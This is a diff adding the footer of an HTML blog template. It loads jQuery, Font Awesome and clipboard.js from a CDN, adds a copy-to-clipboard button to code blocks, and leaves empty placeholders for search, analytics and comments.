+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
